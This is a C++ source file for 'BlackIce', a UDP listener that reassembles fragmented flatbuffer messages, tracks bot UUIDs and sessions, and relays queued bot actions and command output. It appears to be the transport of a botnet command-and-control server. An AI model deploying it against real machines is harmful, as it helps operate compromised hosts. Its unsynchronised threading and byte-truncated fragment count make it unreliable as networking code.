#include "pch.h"
#include "blackIce.h"
#include "blackIceConfig.h"
#include "anomaly_api_generated.h"

#define MAX_UDP_FRAG_SIZE 1000

BlackIce::BlackIce(LightBringer* man) {
    this->listeningPort = LISTENING_PORT;
    this->manager = man;
}

void BlackIce::SetListeningPort(uint16_t port) {
    listeningPort = port;
}

void BlackIce::Init() {
    UdpBind();
    // std::cout << "BlackIce::Init: Starting" << std::endl;
    std::thread(&BlackIce::ProcessBotActions, this).detach();
    this->Start();
}

void BlackIce::Start() {
    unsigned char buf[1600];
    ssize_t dataSize, bufLen = 1600;
    struct sockaddr_in si_client;
    socklen_t slen = sizeof(si_client);
    // int i;  // sock = this->UdpBind();
    PayloadPtr payload = std::make_unique<std::vector<uint8_t>>();
    std::thread processor;
    std::ostringstream strStream;

    if (this->sock == 0) {
        std::cerr << "BlackIce::Start: UDP Socket failed to bind.  Stopping." << std::endl;
        return;
    }

    // Have to refactor this eventually
    while (true) {
        if ((dataSize = recvfrom(this->sock, buf, bufLen, 0, reinterpret_cast<sockaddr*>(&si_client), &slen)) == -1) {
            std::cerr << "BlackIce::Start: UDP Recieve failed.  Stopping." << std::endl;
            perror("");
            return;
        }

        // std::cout << "BlackIce::Start: Recieved packet from " <<
//                inet_ntoa(si_client.sin_addr) << ":" <<
//                ntohs(si_client.sin_port) << std::endl;
        // std::cout << "BlackIce::Start: Data size: " << dataSize << std::endl;

        // Process Connection

        // Copy data from buffer into vector
        payload->assign(&buf[0], (&buf[0] + dataSize));

        // std::cout << "BlackIce::Start: Payload Size: " << payload->size() << std::endl;

        strStream << inet_ntoa(si_client.sin_addr) << ":" << ntohs(si_client.sin_port);

        // std::cout << "strStream: " << strStream.str() << std::endl;
        std::thread(&BlackIce::ProcessUdpPacket, this, strStream.str(), std::move(payload)).detach();
        // ProcessUdpPacket(strStream.str(), std::move(payload));
        payload = std::make_unique<std::vector<uint8_t>>();
        strStream.str("");
    }
}

void BlackIce::UdpBind() {
    struct sockaddr_in si_me;
    // int s;

    if ((this->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror("Failed creating UDP socket.");
        return;
    }

    // Set socket to allow multiple connections
    int *pInt = reinterpret_cast<int *>(malloc(sizeof(int)));
    *pInt = 1;
    if (setsockopt(this->sock, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<int *>(pInt), sizeof(int)) == -1) {
        perror("Failed setting socket options.");
        free(pInt);
        return;
    }
    free(pInt);

    memset(reinterpret_cast<char *>(&si_me), 0, sizeof(si_me));
    si_me.sin_family = AF_INET;
    si_me.sin_port = htons(this->listeningPort);
    si_me.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(this->sock, (const struct sockaddr *) &si_me, sizeof(si_me)) == -1) {
        perror("Failed binding to UDP socket.");
        return;
    }
}

void BlackIce::ProcessUdpPacket(std::string clientId, PayloadPtr payload) {
    // Check if UdpPacket contains UdpFragment
    flatbuffers::Verifier verifier(payload->data(), payload->size());
    bool testOk = verifier.VerifyBuffer<UdpFrag>();

    // std::cout << "ProcessUdpPacket: Payload size: " << payload->size() << std::endl;

    // If verification fails, return from thread
    if (!testOk) {
        // std::cout << "ProcessUdpPacket: UdpFrag Not Verified..." << std::endl;
        return;
    }

    // std::cout << "ProcessUdpPacket: UdpFrag Verified!" << std::endl;

    // Since verification was successful, create / add pointer to data to udpClientMap
    UdpClientMap::const_iterator pairIterator = this->udpClientMap.find(clientId);
    if (pairIterator == this->udpClientMap.end()) {  // Mapping doesn't exist so create it
        VecToPayloadVecPtr tempVec = std::make_shared<std::vector<PayloadPtr>>();
        auto tempPair = std::make_pair(clientId, tempVec);
        this->udpClientMap.insert(tempPair);
    }

    // std::cout << "MapSize: " << this->udpClientMap.size() << std::endl;
    if (this->udpClientMap.at(clientId)->size() == 0) {
        // std::cout << std::this_thread::get_id() << std::endl;
        // If no payloads exist in the vector, move payload into it and start a thread
        this->udpClientMap.at(clientId)->push_back(std::move(payload));
        std::thread(&BlackIce::ProcessClient, this, clientId).detach();
    } else {
        // Else only move a payload into it so we don't have duplicate worker threads
        this->udpClientMap.at(clientId)->push_back(std::move(payload));
    }
}

void BlackIce::ProcessClient(std::string clientId) {
    flatbuffers::FlatBufferBuilder fragBuilder;
    uint8_t totalFrags;
    std::vector<uint8_t> rawAPIT;
    std::unique_ptr<anomaly::APIT> apit;

    // Pointer to vector containing payloads
    VecToPayloadVecPtr payloadVec = udpClientMap.at(clientId);

    // Check first message and see how many messages there should be
    const UdpFrag *frag = flatbuffers::GetRoot<UdpFrag>(payloadVec->at(0)->data());

    totalFrags = frag->totalNum();

    // std::cout << "ProcessClient: Total Fragments: " << static_cast<int>(totalFrags) << std::endl;

    // Wait until all of the messages are in the vector
    while (payloadVec->size() != totalFrags) {
        // std::cout << "ProcessClient: Waiting for fragments" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }

    // std::cout << "ProcessClient: All UDP fragments have been recieved.  Reordering them." << std::endl;

    // Order the messages
    std::sort(payloadVec->begin(), payloadVec->end(),
        [](const PayloadPtr &a, const PayloadPtr &b) -> bool {
            int seqA = flatbuffers::GetRoot<UdpFrag>(a->data())->sequenceNum();
            int seqB = flatbuffers::GetRoot<UdpFrag>(b->data())->sequenceNum();
            return seqA < seqB;
        });

    // Concatenate the UDP Fragment's data
    for (unsigned int i=0; i < payloadVec->size(); i++) {
        frag = flatbuffers::GetRoot<UdpFrag>(payloadVec->at(i)->data());
        rawAPIT.insert(rawAPIT.end(), frag->data()->begin(), frag->data()->end());
    }

    // Check if this data is an ActionResponse
    flatbuffers::Verifier verifier(rawAPIT.data(), rawAPIT.size());
    bool testOk = verifier.VerifyBuffer<anomaly::API>();

    // If verification fails, clear vector and return from thread
    if (!testOk) {
        // std::cout << "ProcessUdpPacket: APIT Not Verified..." << std::endl;
        payloadVec->clear();
        // payloadVec->shrink_to_fit();  // Probably don't really have to do this
        return;
    }

    // std::cout << "ProcessUdpPacket: APIT Verified!" << std::endl;

    // If it is, push it to the manager's queue
    apit = anomaly::UnPackAPI(rawAPIT.data());

    // If it's the first beacon for the bot, make the UUID the key of the map
    if (!apit->uuid.empty()) {
        this->clientIdMap.insert_or_assign(apit->uuid, clientId);  // Insert UUID -> ClientID so we can look it up later
    } else {
        // Else insert or assign the SessionId to be the key of the map
        this->clientIdMap.insert_or_assign(apit->sessionId, clientId);
    }

    // Push action response to the queue
    this->manager->PushActionResponse(std::move(apit));

    // Clear vector.  This signals to ProcessUdpPacket that there is no existing thread processing a vector
    payloadVec->clear();
    // payloadVec->shrink_to_fit();  // Probably don't really have to do this

    // std::cout << "ProcessClient: Exiting" << std::endl;
}

void BlackIce::ProcessBotActions() {
    APITPtr actionAPI;
    ssize_t send;
    std::string clientInfo;
    std::string clientIp;
    unsigned int clientPort;
    size_t tokenIndex;
    flatbuffers::FlatBufferBuilder udpSendBuilder;
    flatbuffers::FlatBufferBuilder responseBuilder;

    while (true) {
        // If queue is empty, sleep a little then check again
        if (this->manager->GetActionSize() == 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        actionAPI = this->manager->PopAction();

        // Find client connection info
        if (!actionAPI->uuid.empty()) {
            clientInfo = this->clientIdMap.at(actionAPI->uuid);
        } else {
            clientInfo = this->clientIdMap.at(actionAPI->sessionId);
        }

        tokenIndex = clientInfo.find(":");
        if (tokenIndex != std::string::npos) {
            std::string temp;
            clientIp = clientInfo.substr(0, tokenIndex);
            temp = clientInfo.substr(tokenIndex + 1, clientInfo.size() - tokenIndex);
            std::stringstream toInt(temp);
            toInt >> clientPort;
        } else {
            continue;
        }

        // Construct Client Struct
        struct sockaddr_in si_client;
        socklen_t slen = sizeof(si_client);

        memset(reinterpret_cast<char *>(&si_client), 0, sizeof(si_client));
        si_client.sin_family = AF_INET;
        si_client.sin_port = htons(static_cast<uint16_t>(clientPort));
        si_client.sin_addr.s_addr = inet_addr(clientIp.c_str());

        responseBuilder.Finish(anomaly::CreateAPI(responseBuilder, actionAPI.get()));

        uint8_t *respPtr = responseBuilder.GetBufferPointer();
        int respSize = responseBuilder.GetSize();

        std::vector<uint8_t> rawResponse(respPtr, respPtr + respSize);

        UdpFragT udpSendFrag;  // SeqNum defaults to 1
        uint8_t test = static_cast<uint8_t>(rawResponse.size());
        udpSendFrag.totalNum = static_cast<uint8_t>((test / MAX_UDP_FRAG_SIZE) + 1);  // Always initialize total
        flatbuffers::Offset<UdpFrag> tempUdpFrag;

        int i = 0;
        int offset = 0;
        while (static_cast<size_t>(offset + MAX_UDP_FRAG_SIZE) <= rawResponse.size()) {
            udpSendFrag.data.assign(rawResponse.begin() + offset, rawResponse.begin() + offset + MAX_UDP_FRAG_SIZE);
            i++;
            offset = i * MAX_UDP_FRAG_SIZE;

            tempUdpFrag = CreateUdpFrag(udpSendBuilder, &udpSendFrag);
            udpSendBuilder.Finish(tempUdpFrag);

            // std::cout << "UDP Buffer Size: " << udpSendBuilder.GetSize() << std::endl;

            send = sendto(this->sock, udpSendBuilder.GetBufferPointer(), udpSendBuilder.GetSize(), 0, (struct sockaddr *) &si_client, slen);
            // if (send == -1) {
                // std::cout << "ProcessBotActions: Send #1 failed." << std::endl;
            // }

            udpSendFrag.sequenceNum++;
            udpSendBuilder.Clear();
        }
        int remain = static_cast<int>(rawResponse.size()) % MAX_UDP_FRAG_SIZE;
        if (remain > 0) {
            udpSendFrag.data.assign(rawResponse.begin() + offset, rawResponse.end());

            tempUdpFrag = CreateUdpFrag(udpSendBuilder, &udpSendFrag);
            udpSendBuilder.Finish(tempUdpFrag);

            send = sendto(this->sock, udpSendBuilder.GetBufferPointer(), udpSendBuilder.GetSize(), 0, (struct sockaddr *) &si_client, slen);
            // if (send == -1) {
                // std::cout << "ProcessBotActions: Send #2 failed." << std::endl;
            // }
        }

        udpSendBuilder.Clear();
        responseBuilder.Clear();
    }
}


void BlackIce::QueueTest() {
    auto actionResp = std::make_unique<anomaly::APIT>();

    actionResp->responses.at(0)->actionId = "TEST_ACTION_ID";
    actionResp->responses.at(0)->stdoutput = "This is command output";

    manager->PushActionResponse(std::move(actionResp));
}
